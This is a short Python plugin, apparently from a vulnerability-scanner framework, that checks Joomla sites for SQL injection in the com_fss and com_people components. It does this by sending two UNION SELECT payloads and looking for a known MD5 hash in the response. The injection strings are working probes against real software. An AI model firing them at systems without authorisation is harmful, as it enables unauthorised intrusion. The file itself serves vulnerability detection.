#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
#__Author__ = luca
#__Service_ = joomla
#__Refer___ = 
#___Type___ = sqli
"""

def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payloads = (
         "index.php?option=com_fss&view=test&prodid=777777.7%27+union+all+select+77777777777777%2C77777777777777%2C77777777777777%2Cmd5(3.1415)%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777%2C77777777777777--+D4NB4R%22",
         "index.php?option=com_people&controller=people&task=details&id=-1 UNION SELECT md5(3.1415),2,3"
         )
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode, _ = curl.curl('"%s"' % url)
        if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla','http://www.example.com/')[1])